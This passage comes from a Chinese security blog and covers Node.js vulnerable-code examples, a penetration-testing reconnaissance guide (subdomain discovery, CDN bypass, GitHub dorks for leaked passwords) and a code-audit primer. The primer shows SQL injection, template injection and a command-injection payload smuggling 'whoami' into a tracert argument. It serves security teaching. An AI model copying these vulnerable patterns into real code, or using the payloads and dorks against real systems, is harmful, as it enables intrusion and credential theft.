req.body.username; const p = req.body.password; console.log(u); console.log(p); var connection = mysql.createConnection(&#123; host : &#x27;localhost&#x27;, user : &#x27;root&#x27;, password : &#x27;123456&#x27;, database : &#x27;test&#x27; &#125;); connection.connect(); const sql = &#x27;select * from admin where un=&quot;&#x27;+u+&#x27;&quot; and pw=&quot;&#x27;+p+&#x27;&quot;&#x27;; console.log(sql); connection.query(sql,function(error,data)&#123; if(error)&#123; console.log(&#x27;database connection failure!&#x27;); &#125; try&#123; if(u==(data[0][&#x27;un&#x27;])&amp;&amp;p==(data[0][&#x27;pw&#x27;]))&#123; res.send(&#x27;welcome to admin&#x27;); &#125; &#125;catch&#123; res.send(&#x27;error&#x27;); &#125; &#125;)&#125;)// 当使用get接收数据时，使用req.query来接收数据app.get(&#x27;/&#x27;,function(req,res)&#123; res.sendFile(__dirname+&#x27;/&#x27;+&#x27;index.html&#x27;); // 渲染页面，调用index.html&#125;)const server = app.listen(3000,function()&#123; console.log(&#x27;web open success !&#x27;);&#125;) 文件管理12345678910111213141516171819202122const fs = require(&#x27;fs&#x27;);const express = require(&#x27;express&#x27;);const app = express();app.get(&#x27;/file&#x27;,function(req,res)&#123; const dir=req.query.dir; console.log(dir); filemanage(dir);&#125;)var server = app.listen(3000,function()&#123; console.log(&#x27;web server open on port 3000&#x27;)&#125;)function filemanage(dir)&#123; fs.readdir(dir,function(err,files)&#123; if (err) &#123; return console.error(err); &#125; files.forEach(function(file)&#123; console.dir(file) &#125;); &#125;)&#125; 命令&#x2F;代码执行1234567const rce=require(&#x27;child_process&#x27;);rce.exec(&#x27;notepad&#x27;);rce.spawnSync(&#x27;notepad&#x27;);// 把字符串当做代码解析eval(&#x27;console.log(1);&#x27;)// 所以我们可以通过代码执行来达到命令执行的目的eval(&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;); 原型链污染在CTF中很多，如果攻击者控制并修改了一个对象的模型，__proto__，那么将可以影响所有和这个对象来自同一个类、父祖类的对象，举个例子 12345678let foo = &#123;bar:1&#125; // foo是一个简单的javascript对象console.log(foo.bar) //此时输出为1foo.__proto__.bar = 2 //修改foo原型console.log(foo.bar) //由于查找顺序的原因，foo.bar还是1let zoo = &#123;&#125; //创建一个空的zoo对象console.log(zoo.bar) //此时输出为2，这是一个继承关系 所以接下来就很好理解了，做一个命令执行吧 123456let foo = &#123;bar:1&#125; console.log(foo.bar) foo.__proto__.bar = &quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;console.log(foo.bar) let zoo = &#123;&#125;console.log(eval(zoo.bar)) WebPack打包器，设想一个场景，当你需要加载很多js文件的时候，文件里面又有好多函数，比如1.js里面定位了函数，2.js里面调用了这个函数，所以你要先加载1.js再加载2.js，就会比较麻烦，所以可以用webpack都写在一个文件如main.js里面 具体用法可以参考： https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA 安装方式 1npm i webpack webpack-cli webpack有五个核心概念： 【入口(entry)】：指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。 【输出(output)】：在哪里输出文件，以及如何命名这些文件。 【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。 【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。 【模式(mode)】：有生产模式production和开发模式development。 使用在根目录新建webpack.config.js，之后就一直使用 webpack命令来执行 123456789101112131415const path= require(&#x27;path&#x27;); //node内置核心模块，用来设置路径。module.exports = &#123; mode: &#x27;development&#x27;, //开发、生产环境(二选一)，mode: &#x27;production&#x27; entry: &#x27;./src/main.js&#x27;, // 入口文件配置（精简写法） /*完整写法： entry:&#123; main:&#x27;./src/js/app.js&#x27; &#125; */ output: &#123; //输出配置 filename: &#x27;app.js&#x27;,//输出文件名 path: path.resolve(__dirname, &#x27;build&#x27;) //输出文件路径(绝对路径)，__dirname表示该文件当前文件夹 &#125;,&#125;; 配置好之后，可以直接在控制台运行 npx webpack 来打包 安全问题在开发模式下，所有的代码都可以看到；当使用生产模式时，就只能看到打包后定义的输出文件且内容很少 工具： https://github.com/rtcatc/Packer-Fuzzer jQuery是一个快速、简洁的JavaScript框架，提供一个简便的设计模式，优化HTML文档操作等 具体用法啥的在前面JS原生类的库开发已经写过了 低版本的jQuery爆出过一些漏洞，xss居多，比如CVE-2020-11022和CVE-2020-11023","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"开发","slug":"开发","permalink":"https://ink-scholar.github.io/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"渗透测试--信息搜集","slug":"渗透测试--信息搜集","date":"2024-01-02T15:55:32.430Z","updated":"2024-01-21T13:40:09.720Z","comments":true,"path":"2024/01/02/渗透测试--信息搜集/","permalink":"https://ink-scholar.github.io/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"","text":"大部分就是利用一些在线的威胁情报网站，很多技巧都集合在一些工具里，一般几乎都是傻瓜式的操作 业务资产企业信息 名称 地址 小蓝本 https://www.xiaolanben.com/ 企查查 https://www.qcc.com 国外企查 https://opencorporates.com 爱企查 https://aiqicha.baidu.com/ 以上的查询其实就是输入一个公司名，然后会得到和企业相关的结果，如果网站收费，可以去咸鱼拼多多等地方买会员 关注点除了域名之外，还有APP和微信公众号等 根据以上查询的结果归结为以下五种应用，然后对每一种应用类型进行更加细致的信息搜集 Web应用web单域名通过备案信息获取 名称 地址 备案信息查询 http://www.beianx.cn/ 备案管理系统 https://beian.miit.gov.cn/ 先输入公司名称，然后根据列出的备案号，重新输入备案号 “-” 前的部分，继续查询 通过企业产权获取和企业信息查询方式一致 通过注册域名获取通过域名注册的网站查询，比如在腾讯云，输入之前获取到的域名信息，看看哪些域名被注册了，当然这只是个思路，并不能保证准确性，当然也很可能，这个公司注册了，但是并未投入使用，如果有业务在上面的话，就有扩展了攻击面 通过反查解析获取通过IP地址反查 名称 地址 微步在线 https://x.threatbook.cn/ 在线同IP网站查询工具 http://dns.bugscaner.com/ web子域名DNS数据 名称 地址 dnsdumpster https://dnsdumpster.com/ 证书查询https的站点可以直接看到证书，通过证书匹配子域名，通过以下网站或者网络空间搜索引擎cert语法 名称 地址 CertificateSearch https://crt.sh/ 网络空间根据子域名查询语法查询，比如fofa的domain&#x3D;”” 名称 地址 FOFA https://fofa.info/ 全球鹰 http://hunter.qianxin.com/ 360 https://quake.360.cn/quake/ 零零信安（只能国内） https://0.zone/ Shodan（国外） https://www.shodan.io/ Censys（国外） https://censys.io/ 威胁情报 名称 地址 微步在线 https://x.threatbook.cn/ 奇安信威胁情报中心 https://ti.qianxin.com/ 360威胁情报中心 Https://ti.360.cn/#/homepage 枚举解析可以通过在线平台的接口查（不推荐） 工具推荐oneforall，把上述的方法查不多做了一个结合，通过api接口调用，不过现在这个工具也存在各种各样的问题，可以自己对代码进行一下魔改 web架构指纹识别 名称 地址 TideFinger潮汐指纹 http://finger.tidesec.net/ 云悉指纹 https://www.yunsee.cn/ Wapplayzer https://github.com/AliasIO/wappalyzer 当然，有时候很容易会出现误报，需要自己甄别 工具gotoscan适合在不出网环境中使用 源码获取开源直接搜索获取，然后对比一下网站访问情况来确定是否正确 闭源源码不能直接获取是很正常的情况，可以看网站是否存在一些配置不当问题造成的源码泄漏 以下五种是比较常见的情况 git源码泄漏在执行 git init 初始化目录时，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码时，如果没有把 .git 目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码，可以在网站后加上 .git&#x2F; 看看目录是否存在 通过工具：GitHack 来实现（ https://github.com/lijiejie/GitHack ） svn源码泄漏原理上和git泄漏差不多，判断方式直接在网站后面加上 .&#x2F;svn&#x2F; 看看是否存在即可 通过工具：SvnHack-master 来实现 使用时 -u 指定url时，格式为 url&#x2F;.svn&#x2F;entries ，后面加上 – download 即可下载 网站备份压缩文件可以通过目录扫描工具进行尝试 DS_Store文件泄漏是Mac下Finder用来保存如何展示文件或文件夹的数据文件，每个文件夹下对应一个，如果将它上传至服务器，可能造成目录结构泄漏 通过工具：https://github.com/lijiejie/ds_store_exp 来实现 composer.json类似于版权文件的介绍，php中使用 其他方向识别出大致信息却无法下载访问网站，查看加载文件，选取一些看着比较有特点的脚本文件、js文件等，然后去github等网站去搜索这个文件，查看结果 未识别出信息使用码云资源获取有时通过工具扫描，可以扫出一些特征信息，比如开发者的邮箱，可以通过github等平台去尝试搜索 其他行业开发使用对口资源站获取比如互站网 JS前端架构什么是JS渗透测试在javascript中也存在变量和函数，我们可以通过浏览器查看源代码获取真实的点，获取url、敏感信息。一般会在JS中寻找更多的URL地址，JS代码逻辑（加密算法、APIkey，验证逻辑） JS安全问题源码泄漏、未授权访问、敏感key泄漏、API接口安全 流行的JS框架Vue、NodeJS、JQuery、Angular 手动分析当确定为js框架后，访问页面刷新，F12查看加载的JS文件，寻找名字有意义的js文件，如login.js 也可以直接搜索，搜索内容可以是如下： src&#x3D;，path&#x3D;，method:”get”，http.get(“，method:”post”，http.post(“，$.ajax，service.httppost，service.httpget 大部分地址的代码需要追踪分析 半自动分析结合burp，访问，在Target–Site map中找到网站地址，右键，Engagement tools–Find scripts，即可 可以用burp官方插件，JS Link Finder和JS Miner 也可以用第三方的，推荐HaE（知道创宇404开发）（ https://github.com/gh0stkey/HaE ） ， Unexpected_information（ https://github.com/ScriptKid-Beta/Unexpected_information ） 全自动浏览器插件：findsomething（一个熊猫头） 脚本工具：JSFinder（不推荐用），URLFinder（jsfinder升级版，更好用一点）（ https://github.com/pingc0y/URLFinder ） 但是有些js文件我们并不能直接在前端分析出路径，比如登陆后加载的js文件，这时候我们需要Fuzz一下，推荐工具 ffuf ，使用这个工具需要fuzz字典，字典下载地址：https://wordlists.assetnote.io 另一个是针对Webpack等前端打包工具所构造的网站进行一个扫描，Packer-Fuzzer ，大部分前端都会用到Webpack 中间件Web服务器判断方法有很多，比如从响应头的Server信息，Apache、Nginx、IIS、lighttpd，Web服务器主要用于提供静态内容，如HTML、CSS和JavaScript等，以及处理对这些内容的HTTP请求。Web服务器通常使用HTTP协议来与客户端通信，以便在浏览器中呈现网页。 应用服务器Tomcat、Jboss、Weblogic、Websphere，相比于web服务器，他们的特点是有特定端口服务的开放，所以应用服务器的探测要用到端口扫描，通过Server信息一般很难看到，应用服务器主要用于提供动态内容，如数据库查询和Web应用程序逻辑等，通常与Web服务器协同工作。应用服务器通常使用专有协议与客户端通信，以便执行更复杂的操作和提供更高级的功能。 扫描工具：nmap、masscan 被动扫描：利用网络空间搜索引擎。fofa等 端口扫描还可以扫其他的服务，比如数据库mysql、sqlserver、oracle、redis、mongodb，操作系统linux、windows等 有一种现象需要注意，比如一个web搭在了内网，然后把web端口转到了外网，这时你只能扫外网ip，你可以扫到web服务，但是如果内网中开启了比如mysql且没有转到外网，这样你是扫不到的，但是web本身用到了mysql，这是一种现象 Waf识别web应用防火墙，云waf、硬件waf、软件waf、代码级waf这些，识别的话可以看一下他们的拦截页面，identywaf项目内置了一些拦截页面，当然也可以使用自动的工具。推荐工具 wafw00f ， identYwaf。除此之外，还可以使用fofa等直接查域名即可 蜜罐识别是一种安全威胁的检测技术，本质在于引诱和欺骗攻击者，并通过记录攻击者的攻击日志来产生价值 根据蜜罐与攻击者之间进行的交互程度，分为低、中、高交互蜜罐 识别工具：360quake（ https://github.com/360quake/quake_rs ） ， 当然，也是用网络空间搜索引擎来识别的 一般情况下，使用web去访问一些蜜罐端口会出现下载的情况，比如蜜罐开启了mysql应用，然后我们去爆破它，蜜罐就会记录攻击者的账号密码，账号密码会采用web jsonp去传输，当你http协议访问，就会被下载，说到底蜜罐这些功能服务还是使用web功能来实现的 CDN配置加速域名（子域名获取真实IP）、加速区域（全球ping）、加速类型（证书） 当然以上方法和配置有关 判断是否存在多地区ping，看一下IP是否相同，若不同，则使用了CDN，使用网站：17ce.com、ping.chinaz.com 如果你怀疑某个ip是否是这个域名的真实ip，可以将这个ip和域名写入hosts文件，然后访问域名，若成功，则是 绕过CDN主动寻找&amp;遗留文件除了上诉这些子域名等方法，还可以尝试一些主动漏洞或者遗留文件，如ssrf，让站点来主动访问我们，可以用dnslog平台来记录站点的ip，当然如果网站存在像远程加载图片这种功能，同样可以利用这种方法，让网站主动来访问我们，然后记录下ip地址；遗留文件如phpinfo这种配置文件，也可能会 邮件系统有两种情况，第一种就是邮件系统做不了CDN，因为邮件系统记录类型通常为MX，这种记录类型一般无法设置CDN 第二种情况其实也是主动寻找，就是它主动给我发邮件，然后查看显示邮件原文即可看到真实ip 常见的邮件触发点有：RSS订阅、邮箱注册激活、找回密码、邮件推送、邮件通知等 不过在收到邮件时要先看一下发件人，是否是使用了他们自己的邮件服务器，因为有可能是代发，使用如126这种其他的邮箱代发 还有一种骚操作：首先你自己用vps搞个邮箱服务器，然后你发送邮件到一个不存在的邮箱地址，因为该用户不存在，所以发送失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知，不过如果对方设置了一些策略，比如任何邮件地址都可以投递成功这种，这种方法就失效 这里必须用自己的邮件服务器，如果你用比如QQ邮箱去发送，这样投递失败的话，错误信息会先发给QQ，然后QQ在发给我，这样得到的ip其实是QQ的 在线网站接口查询https://get-site-ip.com/ 国外接口，输入域名直接返回真实ip，不过效果的话就要看运气了 https://fofa.info/extensions/source fofa可以查，不过要花钱，如果查国外的话，效果还不错，但是如果查国内站点，效果属实一般甚至没啥效果（法律风险） 全网扫描一般步骤为判断加速厂商（ https://tools.ipip.net/cdn.php ） ， IP库筛地址段（ https://cz88.net/geo-public ） ， 配置范围扫描（工具 fuckcdn） 就是先判断厂商，比如是阿里云，然后再去库里面筛选阿里云的ip地址段，然后将这些ip段加入到工具里，再把网站的关键词加到工具里，然后开扫 这个工具会先从ip段扫描符合开放的端口，再去页面找之前设置的关键字，然后返回结果，不过如果站点不支持ip访问，那就不行了 这时候换另一个工具： Bypass_cdn 框架组件Python开发框架Django可以用插件识别，数据包中一般存在Set-Cookie:csrftoken&#x3D; Flask插件识别，数据包中一般会出现flask PHP开发框架ThinkPHP插件识别，数据包中带有ThinkPHP，网站的图标识别，还有很多是用thinkPHP二次开发 Laravel插件识别，数据包特征 Yii插件识别，数据包特征 JAVA组件52类110个主流的JAVA组件 https://blog.csdn.net/agonie201218/article/details/125300729 Fastjson&#x2F;JacksonFastjson可以将Java对象和json格式字符串之间相互转换 在提交json数据包中修改测试，Fastjson组件会把01解析成1，Jackson组件在解析01时会抛出异常 https://forum.butian.net/share/1679 Shiro执行身份验证、授权、密码和会话管理 请求包的cookie中存在rememberMe字段，返回包中存在set-Cookie: rememberMe&#x3D;deleteMe。请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe。有时候服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为rememberMe&#x3D;1，若响应包有rememberMe&#x3D;deleteMe，则基本可以确定网站是apache shiro搭建的 Struts2一般使用此框架后缀带do或action，可以尝试进行利用 Springboot默认报错页面 还有他的默认图标，一个绿色的叶子，icon_hash&#x3D;116323821 Solar一般开放8983端口 APP应用获取APP名称获取1、爱企查–知识产权 2、七麦( https://qimai.cn )、点点( https://app.diandian.com )、小蓝本、豌豆荚查名称 URL网站备案获取1、备案信息查询 2、网站上有APP下载 3、应用市场直接搜单位名称 获取资产信息抓包假设一个场景，我们打开APP时，开启抓包但是没有数据，点击登录这个功能时抓到了包，得到了一个网址，但是这个网址在反编译后并没有得到 原因就是登录界面是APP打包的资源，并没有对外发送数据，而反编译也是一个静态分析的过程，所以我们还要进行一个动态的分析 但是如果我们打开APP时就有数据包，那通过静态分析能得到数据吗？ 那也不一定，因为APP可能会对这些网址进行加密处理，一般的静态分析工具通过正则不一定可以匹配的到 这是一个动态分析的过程，但是我们在模拟器中抓包，肯定是抓不全的，和代理证书有关，不过可以借助下面的MobSF平台来实现动态调试 提取使用一些工具和在线的平台 MobSF(自己手动搭建，可以动态和静态分析，推荐，https://github.com/MobSF/Mobile-Security-Framework-MobSF )、AppInfoScanner( https://github.com/kelvinBen/AppInfoScanner ，推荐) MobSF在进行动态调试时，需要在本地安装一个模拟器，比如逍遥模拟器即可 小程序应用获取在各大平台（微信、支付宝等）搜索 小程序抓包在基础篇提到过，就是burp和proxifier的联动 小程序结构主体一个小程序的主体部分由三个文件组成，必须放在项目的根目录，如下 app.js — 必须要有，是小程序的逻辑 app.json — 必须要有，是小程序的公共配置 app.wxss — 不是必须的，是小程序的公共样式表 页面页面由四个文件组成 xxx.js是页面逻辑，xxx.json是页面配置，xxx.wxml是页面结构，xxx.wxss是页面样式 目录结构pages 页面文件夹， index 首页， logs 日志， util 工具类（mina框架自动生成）， app.js 入口js（类似于java类中的main方法）、全局js， app.json 全局配置文件， app.wxss 全局样式文件， project.config.json 跟你在详情中勾选的配置一样， sitemap.json 用来配置小程序及其页面是否允许被微信索引 小程序逆向推荐个工具 http://xcx.siqingw.top ，目前只能在windows x86和x64 架构运行，具体操作方法网站上都有，这里大致说一下 这个工具在反编译小程序分两部分，选择解包文件和刷新反编译包，解包文件地址为小程序的目录地址，在电脑端的微信点击微信—文件管理，打开文件路径后回到它的上一级，选择Applet文件夹，可以把所有文件夹删掉，然后访问一下你想逆向的小程序，这个目录下面就会出现这个小程序的文件夹，这个就是你要解包的文件地址，选择里面的 .wxapkg文件即可，如果有多个.wxapkg文件，全选即可，不过要将__APP__.wxapkg放在第一个，解包后点击刷新反编译包即可，之后在操作区点击新版反编译，然后就可以在指定目录看到结果 之后使用微信官方的微信开发者工具，将刚刚反编译后的源码导入，即可进行调试，如果js加载有保存导致页面无法正常显示，可以在右上角的详情—本地设置—将JS编译成ESS的勾选给去掉，即可，将可视化打开，通过点击右侧的代码文件，左侧的可视化界面就会随之跳转 之后我们就可以先简单测试一下未授权访问之类的信息，比如小程序需要先登录，但是我们本地打开后访问一些文件，成功了就是未授权，或者在源码里搜索Accesskey之类的关键字，后面会详细讲解 公开平台微信公众号获取https://weixin.sogou.com ，查询成功后看下有无第三方服务 Github监控人员、域名、邮箱等筛选，如xxx.cn password in:file 更多搜索规则可以自行查阅 关键字配合谷歌搜索： site:Github.com smtp @qq.com site:Github.com smtp password site:Github.com String password smtp 长期监控https://github.com/madneal/gshark ，https://github.com/Explorer1092/Github-Monitor 网盘搜索可以在百度网盘之类的直接搜索，也可以找一些接口 邮箱搜集https://hunter.io/ 信息搜集–工具集合先推荐个地址：https://github.com/guchangan1/All-Defense-Tool F8xhttps://github.com/ffffffff0x/f8x ，一款自动化部署工具 ENScan针对于企业信息查询，在配置文件中自己配置一些cookie和token即可 AsamF集成了fofa、hunter、quake、zoomeye等平台，只需要在配置文件中把key配置好即可使用，优点就是hunter和quake导出是要花费积分的，使用这个工具可以免费导出，配置key的作用在于你的查询权限，如果你在平台上只能查询第一页，那就只能导出第一页 ARL灯塔https://github.com/TophantTechnology/ARL ，可以搜一下ARL魔改版的搭建，把指纹库之类的加了进去 Nemohttps://github.com/hanc00l/nemo_go","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"信息搜集","slug":"信息搜集","permalink":"https://ink-scholar.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"}]},{"title":"代码审计概述","slug":"代码审计概述","date":"2023-12-17T12:43:25.221Z","updated":"2023-12-18T16:55:32.866Z","comments":true,"path":"2023/12/17/代码审计概述/","permalink":"https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"先来一张图 术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧） 用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性） 体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础） 即 一线技巧 –》 思考者 –》 安全本质 个人觉得说的很好，深有感触 安全的本质信任问题！ 一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。 是否该信任普通用户的输入？（前台漏洞） 是否该信任管理员用户的输入？（后台漏洞） 是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击） 不信任任何输入？（信任了输入的检测逻辑） 安全方案模型所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出 为什么是输入？？所有的输入都是恶意的：入侵检测理论的名言 我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手 在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点 程序希望用户输入什么控制流与数据流看两段代码 1234567&lt;html&gt; &lt;body&gt;Hello my name is :&lt;?phpecho $_GET[&quot;name&quot;];?&gt; &lt;/body&gt;&lt;/html&gt; 1234567&lt;html&gt;&lt;script&gt;console.log(Hello my name is :&quot; + &quot;&lt;?phpecho $_GET[&quot;name&quot;];?&gt;&lt;/script&gt;&lt;/html&gt; 将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据） 程序员希望用户输入的一定数据流而不是控制流 一旦我们 输入的数据 能够以某种方式侵入到控制流时，漏洞就产生了 如下 sql注入12345&lt;?php$db = init_db();$username = $_GET[&#x27;username&#x27;];$db-&gt;query(&quot;select * from table where username = &#x27;$username&#x27;&quot;); ?&gt; 我们看一下输入到流转： 输入 –》 php字符串变量 –》 sql语句 –》 数据库 在数据库层面，控制流是sql语句，原本这段代码的本意是： 123456action：selectobject：tablesubject：*condition： key：username value：$username 代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞 比如我们输入：admin’ and 1&#x3D;1# 123456789action：selectobject：tablesubject：*condition： expression：and key1：username value1：$username key2: 1 value2: 1 我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流 SSTI服务端模版注入 Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); echo $output;?&gt; 以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示 我们再看一下错误的写法 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;); echo $output;?&gt; 再看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示 我们在代码层（php）的输入，导致了Twig模板层的数据流入侵到了控制流 命令执行1234&lt;?php$domain = $_GET[&quot;domain&quot;];echo system(&#x27;tracert &quot;&#x27;.$domain.&#x27;&quot;&#x27;)?&gt; 这个代码其实就是tracert命令 程序原意是在 bash程序 中 1234execute： process: exe: tracert --&gt; /bin/tracert arg: $domain 此时，程序必须保证用户的输入只能影响到arg位置，如果不能保障，则会产生漏洞 比如输入： 1baidu.com&quot;;whoami;echo &quot;fuck qax 此时代码里的拼接为 1tracert &quot;baidu.com&quot;;whoami;echo &quot;fuck qax&#x27; 此时代码执行的逻辑为 1234567891011execute： process1: exe: tracert arg: &quot;baidu.com&quot; or--&gt; process2: exe: whoami arg: - or--&gt; exe: echo arg: &quot;fuck qax&quot; 我们在代码层（php）的输入，导致了bash程序层的数据流入侵到了控制流 业务流程问题很多逻辑漏洞、越权漏洞，往往来源于此，也是现代mvc结构出现比较多的问题。（现代mvc结构一般不会出现sql注入[预编译解决]、xss[前端框架解决]、webshell上传[java，python这种网站或者oss存储]） 过度信任用户输入业务功能：输出当前用户信息 123456&lt;?php$user_id = int($_GET[&#x27;user_id&#x27;]);$db = init_db();$data = $db-&gt;query(&quot;select * from user where user_id = $user_id&quot;);echo parse_user_profile($data);?&gt; 这是一个典型的越权读取模型，虽然没有sql注入问题，但是在业务逻辑上的校验有漏洞，信任了用户输入的user_id 不信任用户输入–即信任检测逻辑123456789101112131415161718192021222324252627282930313233//login.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);$password = &quot;test&quot;;$_SESSION[&#x27;is_login&#x27;J = 0;if ($_GET[&#x27;password&#x27;] == $password)&#123; $_SESSION[&#x27;is_login&#x27;] = 1; $_SESSION[&#x27;user_id&#x27;] = $_GET[&quot;user_id&quot;]; // 假定管理员user_id=。 header(&quot;location: /user.php?is_login=l&quot;); exit();&#125;else&#123; echo &quot;密码错误&quot;； exit();&#125;?&gt;// http://192.168.215.129/login.php?password=test&amp;user_id=123//user.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);if ($_SESSION[&#x27;is_login&#x27;] == $_GET[&#x27;is_login&#x27;])&#123; echo &quot;你登录了&quot;; if ($_SESSION[&#x27;user_id&#x27;] == 0)&#123; echo &quot;你是管理员&quot;; &#125;else&#123; echo &quot;你不是管理员&quot;; &#125;&#125;else&#123; echo &quot;没登陆&quot;;&#125;?&gt; 这是一个经典的逻辑绕过漏洞，在整个流程中，开发者完全没有信任用户的输入。 对密码进行了校验，校验通过才存session，并且用户id也是存储于session中的，没法通过cookie伪造绕过鉴权。 不信任任何输入–》对输入进行检测（实际上就是把信任关系绑定到了对输入检测逻辑上，那么一旦输入检测逻辑出现问题，信任关系被打破，就出现了漏洞） php是弱类型语言，在php中，NULL &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “” 所以上面的代码中，我们什么都不输入，就可以绕过检测 用体-用-术看待问题盗张图 切记！！！紧紧抓入输入，即能否让数据流逃逸到控制流，你的输入能否在业务逻辑上产生问题，如何根据污点分析快速筛选出有问题的业务","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"渗透测试--基础入门","slug":"渗透测试--基础入门","date":"2023-12-14T14:33:04.392Z","updated":"2024-01-02T15:19:58.320Z","comments":true,"path":"2023/12/14/渗透测试--基础入门/","permalink":"https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"此篇主要写一点和web相关的基础知识，随便写写，不成系统 Web环境常规知识web应用系统常见的三种搭建方式：子域名、端口、目录三种方式 其他方式还有类似于博客园这种分配站的形式 网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高 对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患 开源源码–源码可见&#x2F;源码不可见（加密，语言特性） 加密一般网上有对应的，比如asp、php加解密网站 语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译 路由访问：url和文件目录对应不上很正常，要根据配置路由决定 前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端 类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关 Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写 WAF: CDN：内容分发服务，提高访问速度，可隐藏真实源IP 反向代理： 正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达） 反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达） 因此你的访问目标只是一个代理，而非真实的应用服务器 正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系 负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况 在宝塔中可以如下进行配置： 12345678910# 定义负载设置upstream fzjh&#123; server 1.1.1.1:80 weight=2; server 2.2.2.2:80 weight=1;&#125;# 定义访问路径和策略location / &#123; proxy_pass http://fzjh/;&#125; APP&#x2F;小程序应用开发架构： 1、原生开发 安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的 2、H5开发 使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题 3、使用flutter开发 谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善 4、常规web开发 就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。 